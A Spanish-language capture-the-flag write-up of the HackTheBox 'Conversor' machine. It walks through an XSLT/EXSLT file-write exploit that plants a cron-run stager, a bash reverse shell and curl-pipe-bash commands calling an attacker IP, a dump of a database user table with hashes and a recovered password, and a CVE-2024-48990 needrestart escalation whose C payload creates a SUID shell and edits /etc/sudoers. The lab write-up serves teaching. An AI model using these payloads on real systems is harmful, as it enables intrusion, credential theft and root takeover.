# Conversor – Por xcotelo

* **Dificultad:** Easy
* **IP:** `10.10.11.92`
* **Fecha de finalización:** 01/11/2025
* **Plataforma:** HackTheBox

---

## 🔎 Enumeración

### Nmap — escaneo inicial

Comando usado:

```bash
sudo nmap -sV -sC -vvv -n -Pn --min-rate 5000 --open 10.10.11.92
```

**Hallazgos principales:**

* `22/tcp` → OpenSSH 8.9p1 Ubuntu
* `80/tcp` → Apache httpd 2.4.52
* Host report name: `conversor.htb`

Salida relevante (resumen):

```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu
80/tcp open  http     Apache httpd 2.4.52
_http-title: Did not follow redirect to http://conversor.htb/
```

---

## 🧭 Enumeración web

Navegando al sitio (o descargando el código fuente) encontramos una aplicación Flask (`app.py`) que revela la existencia de una base de datos SQLite en `/var/www/conversor.htb/instance/users.db` y una `app.secret_key` definida en el código (`'Changemeplease'`).

Fragmentos relevantes del proyecto y estructura detectada:

* `app.py` (Flask)
* `instance/users.db` (SQLite)

---

## app.py (The Vector)

A continuación buscamos una vulnerabilidad de "escritura de archivos". Revisamos la ruta `/convert` (tal como aparece en el PDF):

```python
# Fragmento hipotético de app.py
from lxml import etree
...

@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)

    try:

        # ¡ESTA ES LA VULNERABILIDAD!

        xslt_root = etree.parse(xslt_path)
        
        transform = etree.XSLT(xslt_root)
        result = transform(etree.parse(xml_path))
        
        return str(result)
        
    except Exception as e:
        return str(e), 500
```

El PDF apunta a una vulnerabilidad de "Path Traversal", pero la debilidad real es más sutil: no es solo que la aplicación guarde archivos, sino que los procesa con `etree.XSLT()`.

### Teoría de la vulnerabilidad: XSLT + EXSLT — escritura arbitraria de archivos

Se trata de una vulnerabilidad avanzada y potente.

* **XSLT:** lenguaje en XML para transformar documentos XML.
* **libxml2:** la librería en C que usa `lxml` para parsear XML y aplicar transformaciones XSLT.
* **EXSLT:** conjunto de extensiones a XSLT que aporta funciones extra.

La vulnerabilidad está en que `libxml2` implementa un namespace peligroso de EXSLT: `http://exslt.org/common`. Entre sus componentes existe la extensión `<shell:document>`, pensada para que una transformación XSLT pueda volcar salida a varios ficheros.

**El problema:** el atributo `href` de `<shell:document>` acepta rutas absolutas. El procesador XSLT (ejecutándose como `www-data`) escribirá el contenido en cualquier archivo donde tenga permisos de escritura.

Con esto tenemos todo lo necesario:

* **Objetivo:** escribir un `.py` en `/var/www/conversor.htb/scripts/`.
* **Vector:** el propio procesador XSLT de la aplicación.
* **Exploit:** un payload basado en `<shell:document>`.
* **Permisos:** `www-data` es propietario de `/var/www/conversor.htb/`, por lo que puede escribir en `scripts/`.

### Construcción del exploit y cómo atrapar la shell

Montamos un payload en tres etapas, igual que en el PDF.

**Payload 1 — `shell.sh` (reverse shell final):**

En la máquina atacante ejecutamos:

```bash
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/10.10.XX.XX/1337 0>&1' >> shell.sh
```

* `10.10.XX.XX`: IP del atacante
* `1337`: puerto donde escuchamos

**Payload 2 — `shell.py` (stager / cron job):**

Este script en Python será el que escriba la XSLT en el objetivo y su función es descargar y ejecutar `shell.sh`:

```python
# contenido que escribiremos en /var/www/conversor.htb/scripts/shell.py
import os
os.system("curl 10.10.XX.XX:8000/shell.sh|bash")
```

Hacemos esto en lugar de poner la reverse shell directamente en el XSLT porque los caracteres especiales (como `&`) suelen dar problemas cuando se incrustan en XML.

**Payload 3 — `shell.xslt` (exploit de escritura de archivos):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.XX.XX:8000/shell.sh|bash")
        </shell:document>
    </xsl:template>

</xsl:stylesheet>
```

Puntos clave del XSLT:

* `xmlns:shell="http://exslt.org/common"` importa las extensiones EXSLT.
* `extension-element-prefixes="shell"` declara que usaremos esa extensión.
* `<shell:document href="/ruta/absoluta" method="text">` escribe texto plano en la ruta indicada.

**XML de prueba:** podemos usar una salida XML de nmap, por ejemplo `sudo nmap -sC -oX nmap.xml 10.10.11.92`.

#### Paso 1 — Preparar listeners (atacante)

Terminal 1 — Subir `shell.sh`:

```bash
python3 -m http.server 8000
```

Terminal 2 — escuchar con netcat:

```bash
nc -lvnp 1337
```

#### Paso 2 — Aplicar el exploit

* Accede a `http://conversor.htb`.
* Ve a `/convert` y sube `nmap.xml` como XML y `shell.xslt` como XSLT.
* Pulsa "Convert" — el servidor procesará el XSLT y escribirá `/var/www/conversor.htb/scripts/shell.py`.

#### Paso 3 — Shell recibida

Netcat mostrará una conexión desde `10.10.11.92` y obtendrás una shell como `www-data`:

```
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.11.92] 49408
www-data@conversor:~$
```

Ya estamos dentro como `www-data`.

## 🗄️ Enumeración base de datos

Abrimos la DB y listamos usuarios:

```sql
sqlite3 /var/www/conversor.htb/instance/users.db
.tables
select * from users;
```

**Usuarios encontrados (ejemplos):**

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
11|admin|21232f297a57a5a743894a0e4a801fc3
18|plswork|5f4dcc3b5aa765d61d8327deb882cf99
...
```

Nota: La contraseña hash de `fismathack` se corresponde con la cadena en claro descubierta: `Keepmesafeandwarm`.

---

## 🔑 Acceso inicial — SSH

Con las credenciales obtenidas pudimos autenticarnos por SSH:

```bash
ssh fismathack@10.10.11.92
# password: Keepmesafeandwarm
```

Sesión obtenida como `fismathack` en Ubuntu 22.04.5 LTS.

---

## 🧩 Enumeración local y búsqueda de privilegios

Listado SUIDs y binarios interesantes (resumen):

* /usr/bin/passwd (suid root)
* /usr/bin/sudo (suid root)
* /usr/bin/mount, /usr/bin/umount, etc.

Al ejecutar `sudo -l` como `fismathack`:

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

---

## 🔬 Vulnerabilidad identificada

La versión de `needrestart` en el sistema es **v3.7**, para la cual existe el **CVE-2024-48990** ("Two-Terminal Attack") — esta vulnerabilidad permite una escalada mediante la inyección de un módulo malicioso en el `PYTHONPATH` y forzar su carga por un binario privilegiado que evalúe código Python.

Se siguió la ruta de explotación conocida (PDF/PoC) para `needrestart` tal como se describe a continuación.

---

## 💣 Preparación del exploit

### Payload C (`lib.c`) — `__init__.so`

Construimos un `__init__.so` con un constructor que, al cargarse con EUID 0, copia `/bin/sh` a `/tmp/poc`, marca SUID y añade una entrada en `/etc/sudoers` como persistencia:

```c
/* lib.c */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
static void a() __attribute__((constructor));
void a() {
    if(geteuid() == 0) {
        setuid(0); setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; chmod u+s /tmp/poc; \
            grep -qxF 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' /etc/sudoers || \
            echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers";
        system(shell);
    }
}
```

Compilar en nuestra maquina:

```bash
gcc -shared -fPIC -o __init__.so lib.c
```

### runner.sh (victim) — Bait script

En la máquina objetivo ponemos un pequeño entorno en `/tmp/malicious` que actúa de cebo: descarga `__init__.so` desde nuestro servidor HTTP, crea `e.py` y ejecuta `PYTHONPATH` apuntando al directorio malicioso. `needrestart` al escanear procesos cargaría el módulo malicioso.

Resumen del flujo:

1. Atacante: `python3 -m http.server 8000` (en la carpeta con `__init__.so`).
2. Victim: descargar y ejecutar `runner.sh`.
```bash
#!/bin/bash
set -e
cd /tmp

mkdir -p malicious/importlib

#    CAMBIAR IP 
curl [http://10.10.XX.XX:8000/__init__.so](http://10.10.14.81:8000/__init__.so) -o /tmp/malicious/importlib/__init__.so

cat > /tmp/malicious/e.py << 'EOF'
import time
import os

while True:
    try:
        import importlib
    except:
        pass
    
    if os.path.exists("/tmp/poc"):
        print("Got shell!")
        os.system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

4. Runner crea `/tmp/malicious/importlib/__init__.so` y ejecuta `PYTHONPATH=/tmp/malicious python3 e.py` en bucle.
5. En otro shell SSH, ejecutar: `sudo /usr/sbin/needrestart` — el proceso `needrestart` cargará el `PYTHONPATH` del proceso como root y ejecutará el constructor del `.so`.

---

## 🚀 Ejecución y obtención de root

Pasos realizados en la máquina objetivo:

```bash
# En la máquina atacante:
python3 -m http.server 8000

# En la máquina victim (fismathack):
wget http://10.10.XX.XX:8000/runner.sh
chmod +x runner.sh
./runner.sh    # deja el proceso corriendo, no lo cierres

# En otra sesión SSH como fismathack ejecutar:
sudo /usr/sbin/needrestart
```

Tras ejecutar `needrestart`, el payload compilado se carga como root y crea `/tmp/poc` con permiso SUID. El script detecta la existencia de `/tmp/poc` y usa la entrada "sudo" que el payload añadió para ejecutar `/tmp/poc -p` y obtener shell con UID 0.

Comprobación final:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
4**********************
```

---

## ✅ Resultado

<img width="700" height="554" alt="image" src="https://github.com/user-attachments/assets/4c2e3a4a-ad1c-4489-9060-d59ba2783f78" />
